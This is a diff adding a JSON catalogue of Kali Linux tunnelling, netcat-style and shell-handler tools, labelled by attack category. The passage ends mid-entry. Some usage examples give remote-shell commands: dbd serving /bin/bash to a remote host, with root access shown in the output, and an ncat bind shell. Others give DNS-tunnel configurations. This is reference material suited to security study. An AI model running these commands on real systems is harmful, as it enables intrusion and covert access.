@@ -1,0 +1,651 @@
+{
+ "cadaver": {
+  "tool": "cadaver",
+  "title": "cadaver",
+  "description": "Command-line WebDAV client cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking. Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "cadaver",
+    "desc": "Command-line WebDAV client cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking. Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).",
+    "install": "cadaver",
+    "size": "194 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "chisel-common-binaries": {
+  "tool": "chisel-common-binaries",
+  "title": "chisel-common-binaries",
+  "description": "Prebuilt binaries for chisel This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "chisel-common-binaries",
+    "desc": "Prebuilt binaries for chisel This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.",
+    "install": "chisel-common-binaries",
+    "size": "107.75 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "chisel": {
+  "tool": "chisel",
+  "title": "chisel",
+  "description": "Fast TCP/UDP tunnel over HTTP (program) This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "chisel",
+    "desc": "Fast TCP/UDP tunnel over HTTP (program) This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.",
+    "install": "chisel",
+    "size": "10.12 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "dbd": {
+  "tool": "dbd",
+  "title": "dbd",
+  "description": "Netcat clone with encryption dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License. root@kali:~# dbd -h dbd 1.50 Copyright (C) 2013 Kyle Barnthouse < [email protected] > $Id: dbd.c,v 1.50 2013/05/20 15:40:0",
+  "usage": [
+   {
+    "binary": "dbd",
+    "parts": [
+     [
+      "p",
+      "On the client, respawn every 2400 seconds ( -r 2400 ), run as a daemon ( -D on ), display verbose output ( -v ), and serve a bash shell ( -e /bin/bash ), connecting to the remote host ( 192.168.1.202 ) on port 8080 ( 8080 )."
+     ],
+     [
+      "p",
+      "On the server, listen for a connection ( -l ) on port 8080 ( -p8080 ), and display verbose output (-v)."
+     ],
+     [
+      "code",
+      "root@kali:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080"
+     ],
+     [
+      "code",
+      "root@kali:~# dbd -l -p8080 -v\nlistening on port 8080\nreverse lookup of 192.168.1.202 failed: Unknown server error\nconnect to 192.168.1.202:8080 from 192.168.1.202:58651 (n/a)\nid\nuid=0(root) gid=0(root) groups=0(root)"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "dbd",
+    "desc": "Netcat clone with encryption dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License. root@kali:~# dbd -h dbd 1.50 Copyright (C) 2013 Kyle Barnthouse < [email protected] > $Id: dbd.c,v 1.50 2013/05/20 15:40:0",
+    "install": "dbd",
+    "size": "2.84 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "dns2tcpc": {
+  "tool": "dns2tcpc",
+  "title": "dns2tcpc",
+  "description": "TCP-over-DNS tunnel server and client dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput. The client does not need root privileges.1 A tunneling tool that encapsulate TCP traffic over DNS.",
+  "usage": [
+   {
+    "binary": "dns2tcpd",
+    "parts": [
+     [
+      "code",
+      "root@kali-server:~# cat >>.dns2tcpdrc <<END\nlisten = 0.0.0.0\nport = 53\nuser=nobody\nchroot = /root/dns2tcp\npid_file = /var/run/dns2tcp.pid\ndomain = dns2tcp.kali.org\nkey = secretkey\nresources = ssh:127.0.0.1:22\nEND\nroot@kali-server:~# dns2tcpd -f .dns2tcpdrc\nroot@kali-server:~#"
+     ]
+    ]
+   },
+   {
+    "binary": "dns2tcpc",
+    "parts": [
+     [
+      "code",
+      "root@kali-client:~# cat >>.dns2tcprc <<END\ndomain = dns2tcp.kali.org\nresource = ssh\nlocal_port = 2139\nkey = secretkey\nEND\nroot@kali-client:~# dns2tcpc -f .dns2tcprc\nroot@kali-client:~# ssh root@localhost -p 2139 -D 8090\nThe authenticity of host '[localhost]:2139 ([127.0.0.1]:2139)' can't be established.\nECDSA key fingerprint is aa:bb:1f:cc:f1:ab:7c:71:9b:62:37:8c:f1:60:2e:98.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[localhost]:2139' (ECDSA) to the list of known hosts.\nroot@localhost's password:\nLinux flw 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64\n\nThe programs included with the Kali GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nKali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May  6 22:54:15 2014 from beast.fritz.box\nroot@kali-server:~#"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "dns2tcp",
+    "desc": "TCP-over-DNS tunnel server and client dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput. The client does not need root privileges.1 A tunneling tool that encapsulate TCP traffic over DNS.",
+    "install": "dns2tcp",
+    "size": "152 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "dns2tcpd": {
+  "tool": "dns2tcpd",
+  "title": "dns2tcpd",
+  "description": "TCP-over-DNS tunnel server and client dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput. The client does not need root privileges.1 A tunneling tool that encapsulate TCP traffic over DNS.",
+  "usage": [
+   {
+    "binary": "dns2tcpd",
+    "parts": [
+     [
+      "code",
+      "root@kali-server:~# cat >>.dns2tcpdrc <<END\nlisten = 0.0.0.0\nport = 53\nuser=nobody\nchroot = /root/dns2tcp\npid_file = /var/run/dns2tcp.pid\ndomain = dns2tcp.kali.org\nkey = secretkey\nresources = ssh:127.0.0.1:22\nEND\nroot@kali-server:~# dns2tcpd -f .dns2tcpdrc\nroot@kali-server:~#"
+     ]
+    ]
+   },
+   {
+    "binary": "dns2tcpc",
+    "parts": [
+     [
+      "code",
+      "root@kali-client:~# cat >>.dns2tcprc <<END\ndomain = dns2tcp.kali.org\nresource = ssh\nlocal_port = 2139\nkey = secretkey\nEND\nroot@kali-client:~# dns2tcpc -f .dns2tcprc\nroot@kali-client:~# ssh root@localhost -p 2139 -D 8090\nThe authenticity of host '[localhost]:2139 ([127.0.0.1]:2139)' can't be established.\nECDSA key fingerprint is aa:bb:1f:cc:f1:ab:7c:71:9b:62:37:8c:f1:60:2e:98.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[localhost]:2139' (ECDSA) to the list of known hosts.\nroot@localhost's password:\nLinux flw 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64\n\nThe programs included with the Kali GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nKali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May  6 22:54:15 2014 from beast.fritz.box\nroot@kali-server:~#"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "dns2tcp",
+    "desc": "TCP-over-DNS tunnel server and client dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput. The client does not need root privileges.1 A tunneling tool that encapsulate TCP traffic over DNS.",
+    "install": "dns2tcp",
+    "size": "152 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "dnscat": {
+  "tool": "dnscat",
+  "title": "dnscat",
+  "description": "DNS tunnel (metapackage) This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "dnscat2",
+    "desc": "DNS tunnel (metapackage) This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.",
+    "install": "dnscat2",
+    "size": "16 KB"
+   },
+   {
+    "binary": "dnscat2-client",
+    "desc": "DNS tunnel, the client part This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network. The client is designed to be run on a compromised machine.",
+    "install": "dnscat2-client",
+    "size": "174 KB"
+   },
+   {
+    "binary": "dnscat2-server",
+    "desc": "DNS tunnel, the server part This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network. The server is designed to be run on an authoritative DNS server.",
+    "install": "dnscat2-server",
+    "size": "268 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "goshs": {
+  "tool": "goshs",
+  "title": "goshs",
+  "description": "SimpleHTTPServer written in Go This tool provides a SimpleHTTPServer written in Go, enhanced with features and security. This package contains a simple http server like the Python SimpleHTTPServer but enhanced with a lot of helpful features and security in mind. root@kali:~# goshs -h goshs v2.1.0 Usage: goshs [options] Web server options: -i, --ip IP or Interface to listen on (default: 0.0.0.0) -p, --port The port to listen on (default: 8000) -d, --dir The web root directory (default: current working path) -w, --webdav Also serve using webdav protocol (default: false) -wp, --webdav-port The po",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "goshs",
+    "desc": "SimpleHTTPServer written in Go This tool provides a SimpleHTTPServer written in Go, enhanced with features and security. This package contains a simple http server like the Python SimpleHTTPServer but enhanced with a lot of helpful features and security in mind. root@kali:~# goshs -h goshs v2.1.0 Usage: goshs [options] Web server options: -i, --ip IP or Interface to listen on (default: 0.0.0.0) -p, --port The port to listen on (default: 8000) -d, --dir The web root directory (default: current working path) -w, --webdav Also serve using webdav protocol (default: false) -wp, --webdav-port The po",
+    "install": "goshs",
+    "size": "22.01 MB"
+   }
+  ],
+  "attack_category": "Exfiltration"
+ },
+ "iodine-client-start": {
+  "tool": "iodine-client-start",
+  "title": "iodine-client-start",
+  "description": "Tool for tunneling IPv4 data through a DNS server This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed. Tunnel IPv4 over DNS",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "iodine",
+    "desc": "Tool for tunneling IPv4 data through a DNS server This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed. Tunnel IPv4 over DNS",
+    "install": "iodine",
+    "size": "245 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ligolo-agent": {
+  "tool": "ligolo-agent",
+  "title": "ligolo-agent",
+  "description": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ligolo-ng",
+    "desc": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+    "install": "ligolo-ng",
+    "size": "25.74 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ligolo-mp-client": {
+  "tool": "ligolo-mp-client",
+  "title": "ligolo-mp-client",
+  "description": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ligolo-ng",
+    "desc": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+    "install": "ligolo-ng",
+    "size": "25.74 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ligolo-mp": {
+  "tool": "ligolo-mp",
+  "title": "ligolo-mp",
+  "description": "Multiplayer pivoting solution Ligolo-MP is an advanced version of Ligolo-ng, with client-server architecture, enabling pentesters to play with multiple concurrent tunnels collaboratively. It manages all your TUNs automatically, while also providing a clean GUI to track everything. root@kali:~# ligolo-mp -h Usage of ligolo-mp: -agent-addr string listening address (default \"0.0.0.0:11601\") -daemon enable daemon mode -insecure-agents Disable certificate verification for agents (insecure!) -max-connection int per tunnel connection pool size (default 1024) -max-inflight int max inflight TCP connect",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ligolo-mp",
+    "desc": "Multiplayer pivoting solution Ligolo-MP is an advanced version of Ligolo-ng, with client-server architecture, enabling pentesters to play with multiple concurrent tunnels collaboratively. It manages all your TUNs automatically, while also providing a clean GUI to track everything. root@kali:~# ligolo-mp -h Usage of ligolo-mp: -agent-addr string listening address (default \"0.0.0.0:11601\") -daemon enable daemon mode -insecure-agents Disable certificate verification for agents (insecure!) -max-connection int per tunnel connection pool size (default 1024) -max-inflight int max inflight TCP connect",
+    "install": "ligolo-mp",
+    "size": "129.38 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ligolo-ng-common-binaries": {
+  "tool": "ligolo-ng-common-binaries",
+  "title": "ligolo-ng-common-binaries",
+  "description": "Prebuilt binaries for Advanced ligolo-ng Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ligolo-ng-common-binaries",
+    "desc": "Prebuilt binaries for Advanced ligolo-ng Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+    "install": "ligolo-ng-common-binaries",
+    "size": "158.13 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ligolo-proxy": {
+  "tool": "ligolo-proxy",
+  "title": "ligolo-proxy",
+  "description": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ligolo-ng",
+    "desc": "Advanced, yet simple, tunneling/pivoting tool that uses a TUN interface Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).",
+    "install": "ligolo-ng",
+    "size": "25.74 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "minicom": {
+  "tool": "minicom",
+  "title": "minicom",
+  "description": "Friendly menu driven serial communication program Minicom is a clone of the MS-DOS “Telix” communication program. It emulates ANSI and VT102 terminals, has a dialing directory and auto zmodem download. Upload/download files using the ASCII protocol",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "minicom",
+    "desc": "Friendly menu driven serial communication program Minicom is a clone of the MS-DOS “Telix” communication program. It emulates ANSI and VT102 terminals, has a dialing directory and auto zmodem download. Upload/download files using the ASCII protocol",
+    "install": "minicom",
+    "size": "1.09 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "miredo": {
+  "tool": "miredo",
+  "title": "miredo",
+  "description": "Teredo IPv6 tunneling through NATs The Teredo IPv6 tunneling protocol encapsulates IPv6 packets into UDP/IPv4 datagrams, to allow hosts behind NAT devices to access the IPv6 Internet. Miredo is a Teredo client (as per RFC 4380): it can provide IPv6 connectivity to a dual-stack IPv6/IPv4 host even if it is located behind a NAT. It can also operate as a Teredo relay which forwards IPv6 packets between the IPv6 Internet and remote Teredo clients.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "miredo",
+    "desc": "Teredo IPv6 tunneling through NATs The Teredo IPv6 tunneling protocol encapsulates IPv6 packets into UDP/IPv4 datagrams, to allow hosts behind NAT devices to access the IPv6 Internet. Miredo is a Teredo client (as per RFC 4380): it can provide IPv6 connectivity to a dual-stack IPv6/IPv4 host even if it is located behind a NAT. It can also operate as a Teredo relay which forwards IPv6 packets between the IPv6 Internet and remote Teredo clients.",
+    "install": "miredo",
+    "size": "388 KB"
+   },
+   {
+    "binary": "miredo-server",
+    "desc": "Teredo IPv6 tunneling server The Teredo IPv6 tunneling protocol encapsulates IPv6 packets into UDP/IPv4 datagrams, to allow hosts behind NAT devices to access the IPv6 Internet. Miredo-server provides a Teredo server. Teredo servers help Teredo clients determine their NAT configuration, maintain their NAT binding, and perform hole punching when transmitting IPv6 packets to other Teredo clients and/or Teredo relays.",
+    "install": "miredo-server",
+    "size": "230 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ncat": {
+  "tool": "ncat",
+  "title": "ncat",
+  "description": "NMAP netcat reimplementation ncat is a reimplementation of Netcat by the NMAP project, providing most of the features present in the original implementations, along with some new features such as IPv6 and SSL support. Port scanning support has been removed. Concatenate and redirect sockets",
+  "usage": [
+   {
+    "binary": "nmap",
+    "parts": [
+     [
+      "p",
+      "Scan in verbose mode ( -v ), enable OS detection, version detection, script scanning, and traceroute ( -A ), with version detection ( -sV ) against the target IP ( 192.168.1.1 ):"
+     ],
+     [
+      "code",
+      "root@kali:~# nmap -v -A -sV 192.168.1.1\n\nStarting Nmap 6.45 ( http://nmap.org ) at 2014-05-13 18:40 MDT\nNSE: Loaded 118 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating ARP Ping Scan at 18:40\nScanning 192.168.1.1 [1 port]\nCompleted ARP Ping Scan at 18:40, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 18:40\nCompleted Parallel DNS resolution of 1 host. at 18:40, 0.00s elapsed\nInitiating SYN Stealth Scan at 18:40\nScanning router.localdomain (192.168.1.1) [1000 ports]\nDiscovered open port 53/tcp on 192.168.1.1\nDiscovered open port 22/tcp on 192.168.1.1\nDiscovered open port 80/tcp on 192.168.1.1\nDiscovered open port 3001/tcp on 192.168.1.1"
+     ]
+    ]
+   },
+   {
+    "binary": "nping",
+    "parts": [
+     [
+      "p",
+      "Using TCP mode ( –tcp ) to probe port 22 ( -p 22 ) using the SYN flag ( –flags syn ) with a TTL of 2 ( –ttl 2 ) on the remote host ( 192.168.1.1 ):"
+     ],
+     [
+      "code",
+      "root@kali:~# nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1\n\nStarting Nping 0.6.45 ( http://nmap.org/nping ) at 2014-05-13 18:43 MDT\nSENT (0.0673s) TCP 192.168.1.15:60125 > 192.168.1.1:22 S ttl=2 id=54240 iplen=40  seq=1720523417 win=1480\nRCVD (0.0677s) TCP 192.168.1.1:22 > 192.168.1.15:60125 SA ttl=64 id=0 iplen=44  seq=3377886789 win=5840 <mss 1460>\nSENT (1.0678s) TCP 192.168.1.15:60125 > 192.168.1.1:22 S ttl=2 id=54240 iplen=40  seq=1720523417 win=1480\nRCVD (1.0682s) TCP 192.168.1.1:22 > 192.168.1.15:60125 SA ttl=64 id=0 iplen=44  seq=3393519366 win=5840 <mss 1460>\nSENT (2.0693s) TCP 192.168.1.15:60125 > 192.168.1.1:22 S ttl=2 id=54240 iplen=40  seq=1720523417 win=1480\nRCVD (2.0696s) TCP 192.168.1.1:22 > 192.168.1.15:60125 SA ttl=64 id=0 iplen=44  seq=3409166569 win=5840 <mss 1460>\nSENT (3.0707s) TCP 192.168.1.15:60125 > 192.168.1.1:22 S ttl=2 id=54240 iplen=40  seq=1720523417 win=1480\nRCVD (3.0710s) TCP 192.168.1.1:22 > 192.168.1.15:60125 SA ttl=64 id=0 iplen=44  seq=3424813300 win=5840 <mss 1460>\nSENT (4.0721s) TCP 192.168.1.15:60125 > 192.168.1.1:22 S ttl=2 id=54240 iplen=40  seq=1720523417 win=1480\nRCVD (4.0724s) TCP 192.168.1.1:22 > 192.168.1.15:60125 SA ttl=64 id=0 iplen=44  seq=3440460772 win=5840 <mss 1460>\n\nMax rtt: 0.337ms | Min rtt: 0.282ms | Avg rtt: 0.296ms\nRaw packets sent: 5 (200B) | Rcvd: 5 (230B) | Lost: 0 (0.00%)\nNping done: 1 IP address pinged in 4.13 seconds"
+     ]
+    ]
+   },
+   {
+    "binary": "ndiff",
+    "parts": [
+     [
+      "p",
+      "Compare yesterday’s port scan ( yesterday.xml ) with the scan from today ( today.xml ):"
+     ],
+     [
+      "code",
+      "root@kali:~# ndiff yesterday.xml today.xml\n-Nmap 6.45 scan initiated Tue May 13 18:46:43 2014 as: nmap -v -F -oX yesterday.xml 192.168.1.1\n+Nmap 6.45 scan initiated Tue May 13 18:47:58 2014 as: nmap -v -F -oX today.xml 192.168.1.1\n\n endian.localdomain (192.168.1.1, 00:01:6C:6F:DD:D1):\n-Not shown: 96 filtered ports\n+Not shown: 97 filtered ports\n PORT   STATE SERVICE VERSION\n-22/tcp open  ssh"
+     ]
+    ]
+   },
+   {
+    "binary": "ncat",
+    "parts": [
+     [
+      "p",
+      "Be verbose ( -v ), running /bin/bash on connect ( –exec “/bin/bash” ), only allowing 1 IP address ( –allow 192.168.1.123 ), listen on TCP port 4444 ( -l 4444 ), and keep the listener open on disconnect ( –keep-open ):"
+     ],
+     [
+      "code",
+      "root@kali:~# ncat -v --exec \"/bin/bash\" --allow 192.168.1.123 -l 4444 --keep-open\nNcat: Version 6.45 ( http://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 192.168.1.123.\nNcat: Connection from 192.168.1.123:39501.\nNcat: Connection from 192.168.1.15.\nNcat: Connection from 192.168.1.15:60393.\nNcat: New connection denied: not allowed"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "ncat",
+    "desc": "NMAP netcat reimplementation ncat is a reimplementation of Netcat by the NMAP project, providing most of the features present in the original implementations, along with some new features such as IPv6 and SSL support. Port scanning support has been removed. Concatenate and redirect sockets",
+    "install": "ncat",
+    "size": "807 KB"
+   },
+   {
+    "binary": "ndiff",
+    "desc": "The Network Mapper - result compare utility Ndiff is a tool to aid in the comparison of Nmap scans. It takes two Nmap XML output files and prints the differences between them them: hosts coming up and down, ports becoming open or closed, and things like that. It can produce output in human-readable text or machine-readable XML formats.",
+    "install": "ndiff",
+    "size": "432 KB"
+   },
+   {
+    "binary": "nmap",
+    "desc": "The Network Mapper Nmap is a utility for network exploration or security auditing. It supports ping scanning (determine which hosts are up), many port scanning techniques, version detection (determine service protocols and application versions listening behind ports), and TCP/IP fingerprinting (remote host OS or device identification). Nmap also offers flexible target and port specification, decoy/stealth scanning, sunRPC scanning, and more. Most Unix and Windows platforms are supported in both GUI and commandline modes. Several popular handheld devices are also supported, including the Sharp ",
+    "install": "nmap",
+    "size": "4.70 MB"
+   },
+   {
+    "binary": "nmap-common",
+    "desc": "Architecture independent files for nmap Nmap is a utility for network exploration or security auditing. It supports ping scanning (determine which hosts are up), many port scanning techniques, version detection (determine service protocols and application versions listening behind ports), and TCP/IP fingerprinting (remote host OS or device identification). Nmap also offers flexible target and port specification, decoy/stealth scanning, sunRPC scanning, and more. Most Unix and Windows platforms are supported in both GUI and commandline modes. Several popular handheld devices are also supported,",
+    "install": "nmap-common",
+    "size": "22.74 MB"
+   },
+   {
+    "binary": "zenmap",
+    "desc": "The Network Mapper Front End Zenmap is an Nmap frontend. It is meant to be useful for advanced users and to make Nmap easy to use by beginners. It was originally derived from Umit, an Nmap GUI created as part of the Google Summer of Code. Graphical Nmap frontend and results viewer",
+    "install": "zenmap",
+    "size": "1.76 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "netcat": {
+  "tool": "netcat",
+  "title": "netcat",
+  "description": "TCP/IP swiss army knife A simple Unix utility which reads and writes data across network connections using TCP or UDP protocol. It is designed to be a reliable “back-end” tool that can be used directly or easily driven by other programs and scripts. At the same time it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. This is the “classic” netcat, written by Hobbit . It lacks many features found in netcat-openbsd.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "netcat-traditional",
+    "desc": "TCP/IP swiss army knife A simple Unix utility which reads and writes data across network connections using TCP or UDP protocol. It is designed to be a reliable “back-end” tool that can be used directly or easily driven by other programs and scripts. At the same time it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. This is the “classic” netcat, written by Hobbit . It lacks many features found in netcat-openbsd.",
+    "install": "netcat-traditional",
+    "size": "139 KB"
+   }
+  ],
+  "attack_category": "Exfiltration"
+ },
+ "penelope": {
+  "tool": "penelope",
+  "title": "penelope",
+  "description": "Powerful shell handler Penelope is a powerful shell handler built as a modern netcat replacement for RCE exploitation, aiming to simplify, accelerate, and optimize post-exploitation workflows. root@kali:~# penelope -h usage: penelope [-p PORTS] [-i ] [-c ] [-j ] [-a] [-l] [-h] [-L] [-T] [-CT] [-m ] [-M] [-S] [-C] [-U] [-O] [-s] [-prefix ] [-N ] [-v] [-d] [-dd] [-cu] [args ...] Penelope Shell Handler positional arguments: args Arguments for -s/--serve and SSH reverse shell modes options: -p, --ports PORTS Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options (Default: 4",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "penelope",
+    "desc": "Powerful shell handler Penelope is a powerful shell handler built as a modern netcat replacement for RCE exploitation, aiming to simplify, accelerate, and optimize post-exploitation workflows. root@kali:~# penelope -h usage: penelope [-p PORTS] [-i ] [-c ] [-j ] [-a] [-l] [-h] [-L] [-T] [-CT] [-m ] [-M] [-S] [-C] [-U] [-O] [-s] [-prefix ] [-N ] [-v] [-d] [-dd] [-cu] [args ...] Penelope Shell Handler positional arguments: args Arguments for -s/--serve and SSH reverse shell modes options: -p, --ports PORTS Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options (Default: 4",
+    "install": "penelope",
+    "size": "210 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "powercat": {
+  "tool": "powercat",
+  "title": "powercat",
+  "description": "Netcat features all in powershell v2 This package contains a netcat powershell version. It’s a simple utility which reads and writes data across network connections using DNS or UDP protocol.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "powercat",
+    "desc": "Netcat features all in powershell v2 This package contains a netcat powershell version. It’s a simple utility which reads and writes data across network connections using DNS or UDP protocol.",
+    "install": "powercat",
+    "size": "55 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "proxytunnel": {
+  "tool": "proxytunnel",
+  "title": "proxytunnel",
+  "description": "Help SSH and other protocols through HTTP(S) proxies Proxytunnel creates tunnels through HTTP(S) proxies for any TCP based protocol. It comes in handy when one sits behind a firewall that allows for HTTP(S) traffic only. The program connects stdin and stdout to an origin server somewhere in the Internet through an industry standard HTTP or HTTPS proxy. It was originally written as an extension to SSH, to be used to SSH to a box at home.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "proxytunnel",
+    "desc": "Help SSH and other protocols through HTTP(S) proxies Proxytunnel creates tunnels through HTTP(S) proxies for any TCP based protocol. It comes in handy when one sits behind a firewall that allows for HTTP(S) traffic only. The program connects stdin and stdout to an origin server somewhere in the Internet through an industry standard HTTP or HTTPS proxy. It was originally written as an extension to SSH, to be used to SSH to a box at home.",
+    "install": "proxytunnel",
+    "size": "98 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "ptunnel": {
+  "tool": "ptunnel",
+  "title": "ptunnel",
+  "description": "Tunnel TCP connections over ICMP packets ptunnel is an application that allows you to reliably tunnel TCP connections to a remote host using ICMP echo request and reply packets, commonly known as ping requests and replies. It acts as a proxy and can handle sockets and secured identification. Those features can be very handy when working in a closed networking environment with firewalls and proxies.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "ptunnel",
+    "desc": "Tunnel TCP connections over ICMP packets ptunnel is an application that allows you to reliably tunnel TCP connections to a remote host using ICMP echo request and reply packets, commonly known as ping requests and replies. It acts as a proxy and can handle sockets and secured identification. Those features can be very handy when working in a closed networking environment with firewalls and proxies.",
+    "install": "ptunnel",
+    "size": "133 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "pwnat": {
+  "tool": "pwnat",
+  "title": "pwnat",
+  "description": "NAT to NAT client-server communication pwnat, pronounced “poe-nat”, is a tool that allows any number of clients behind NATs to communicate with a server behind a separate NAT with no port forwarding and no DMZ setup on any routers in order to directly communicate with each other. The server does not need to know anything about the clients trying to connect. Proxy server that works behind both client and server NATs",
+  "usage": [
+   {
+    "binary": "pwnat",
+    "parts": [
+     [
